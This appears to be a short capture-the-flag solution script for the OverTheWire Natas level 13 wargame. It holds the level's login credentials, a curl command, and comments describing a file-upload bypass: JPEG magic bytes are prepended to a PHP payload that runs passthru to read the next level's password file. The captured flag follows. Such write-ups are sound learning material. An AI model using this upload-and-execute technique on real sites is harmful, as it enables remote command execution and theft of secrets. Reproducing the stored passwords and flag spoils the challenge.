#!/bin/bash

 Username="natas13"
 Password="trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC"

# URL:
curl -s -u $Username:$Password http://natas13.natas.labs.overthewire.org

# Code:
# inject image signature to the script
# echo -e "\xFF\xD8\xFF\xE0" > script.php"
# echo "<?php passthru('cat /etc/natas_webpass/natas13'); ?>" >> script.php
# same procedure as level 12 => change the file extension to .php in the navigation bar
# upload the script and get the flag

# Flag:
# z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
